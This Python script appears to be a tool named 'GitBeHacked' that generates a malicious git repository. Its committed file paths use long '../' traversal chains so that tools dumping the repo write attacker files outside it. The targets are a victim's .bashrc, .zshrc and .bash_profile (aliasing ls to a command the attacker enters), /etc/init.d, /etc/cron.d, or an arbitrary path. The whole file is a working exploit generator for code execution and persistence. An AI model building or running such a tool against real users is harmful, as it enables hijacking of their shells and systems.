import sys

from icecream import ic
from git import Repo
import os
import argparse

ic.configureOutput(prefix="")
####
# fu will output the func
# ic.configureOutput(prefix="")
# ic(fu(12))
# fu(12): 14
####
path = os.path.dirname(os.path.realpath(__file__))
superLongParentDir = "../"*20+".."

def fileGenerator(content,locations):
    for location in locations:
        with open(location,"w") as f :
            f.write( content )
        print("[+] file generated at ",end="")
        ic(location)

def cleanFiles(base,locations):
    print("[*] Base is at ",base)
    print("[*] You may need delete it")
    for location in locations:
        try:
            os.remove(location)
        except:
            print("[-] Delete file error at ",location)
            pass

def evilFileGenerator(base,locations):

    fileExists = False
    if os.path.exists(base):
        fileExists = True
    for each in locations:
        if os.path.exists(each):
            fileExists = True

    if fileExists:
        print("[-] file is exists")
        print("[*] do you wanna remove?[y/N]" ,end="")
        feedback = input("")
        if feedback in ["y","Y"]:
            if os.path.isdir(base):
                os.rmdir(base)
        else:
            raise RuntimeError("[-] Conflict ....")


    with open("bashrc","r") as f:
        evilFileFormat = f.read()

    print("[*] you evil command will set as the alias of ls command")
    print("[*] Your command: ",end="")
    userCommand = input()

    os.mkdir(base)
    for eachLocation in locations:
        print("[+] file written now is ",eachLocation)
        with open(eachLocation,"w+") as f:
            f.write(evilFileFormat.replace("<hashtag>",userCommand))

    print("[+] file generated successfully")
    print("[+] evil file location is ",locations)
    pass


def badRepoGenerator( username :str,outputDirName="test",
                      badfileName=".evilcodeExec",atPath="../",
                      fuckMethod="rcfile" ,os = "linux",clean = False):

    assert outputDirName not in [ "","/" ]

    path = "./"
    workingDirectory = path + outputDirName
    print("[+] Generate bad repo ")

    badRepo = Repo.init( path=workingDirectory,mkdir=True )

    # init payload
    evilPayloadBaseDir = ""
    evilPayloadLocation = []

    if os == "linux":
        if fuckMethod == "rcfile":
            evilPayloadBaseDir = superLongParentDir+"/home/"+username+"/"
            for eachfile in [".zshrc",".bashrc",".bash_profile"]:
                evilPayloadLocation.append(evilPayloadBaseDir+eachfile)
            evilFileGenerator(evilPayloadBaseDir,evilPayloadLocation)

        elif fuckMethod == "start":
            print("[*] You choose the start (target need root privilege)")
            evilPayloadBaseDir = superLongParentDir+"/etc/init.d/"
            evilPayloadLocation = [evilPayloadBaseDir+badfileName]

            with open(path+badfileName,"r") as f :
                content = f.read()
            fileGenerator(content,evilPayloadLocation)



        elif fuckMethod == "cron":
            print("[*] cron is hard to used (target better have root privilege)")
            evilPayloadBaseDir = superLongParentDir+"/etc/cron.d/"
            evilPayloadLocation = [evilPayloadBaseDir+badfileName]

            with open(path+badfileName,"r") as f:
                content = f.read()

            fileGenerator(content,locations=evilPayloadLocation)

        elif fuckMethod == "msg":
            print("[*] msg provide a method to add a file out of the git repo folder (you can use like a file adder or msg.exe)")
            print("[*] It can be used as test")
            print("[*] It will use ./[badfilename] file content and add to the relative address about git repo(really create the file)")

            print("[?] Do you wanna continue? [N/y] ",end="")
            if input("") in ["N","n"]:
                print("[-] exiting..")
                exit(3)

            evilPayloadBaseDir = atPath
            evilPayloadLocation = [evilPayloadBaseDir+badfileName]

            with open(path+badfileName ,"r") as f:
                content = f.read()
            fileGenerator(content,evilPayloadLocation)

        pass


    elif os == "win" :
        print("[-] in Coming")
        pass # not available now

    badRepo.index.add(evilPayloadLocation)
    badRepo.index.commit("Evil Generated!")
    print("[+] Generate Repo successfully")

    if clean:
        cleanFiles(evilPayloadBaseDir,evilPayloadLocation)


# def argcheck(obj):
#     try :
#         assert obj.os in ["linux","win"]
#         assert obj.method in ["cron","start","rcfile","msg"]
#     except AssertionError :
#         print("[-] args error")
#         exit(-2)


def main():
    praser = argparse.ArgumentParser()

    praser.add_argument("-D","--outputDirectoryName",help="your repo with contain in this directory default is test",default="test")
    praser.add_argument("-u","--user",help="target username")
    praser.add_argument("-o","--os",help="os version [ win, linux ] default is linux",default="linux",choices=["win","linux"])
    praser.add_argument("-m","--method",help="attack method [ cron, start, rcfile, msg ] ",default="rcfile",choices=["cron","start","rcfile","msg"])
    praser.add_argument("-B","--badfilename",help="badfile in cron mode name",default=".evilcode")
    praser.add_argument("-p","--atpath",help="bad file you want located at path such as ../../../ ")
    praser.add_argument("-c","--clean",help="it will used like file clean to delete file we generate or overwrite add it to confirm",action="store_true")
    arg = praser.parse_args()
    # print(arg)
    # argcheck(arg)
    badRepoGenerator(username=arg.user,
                     outputDirName=arg.outputDirectoryName,
                     badfileName=arg.badfilename,
                     fuckMethod=arg.method,
                     os=arg.os,
                     atPath=arg.atpath,
                     clean=arg.clean
                     )


def banner():
    print('''
              ____ _ _   ____       _   _            _            _ 
             / ___(_) |_| __ )  ___| | | | __ _  ___| | _____  __| |
            | |  _| | __|  _ \ / _ \ |_| |/ _` |/ __| |/ / _ \/ _` |
            | |_| | | |_| |_) |  __/  _  | (_| | (__|   <  __/ (_| |
             \____|_|\__|____/ \___|_| |_|\__,_|\___|_|\_\___|\__,_|
                                                                        
[?] create a repo which contains the file at parent dict and hack back the "githack" like tools
                                                                        ''')
    
    pass

if __name__ == "__main__":
    banner()
    try:
        os.setuid(0)
    except PermissionError:
        print("[-] We need root privilege to generate payload")
        print("[*] Now privilege is: "+os.popen("whoami").read())
        exit(-1)
    main()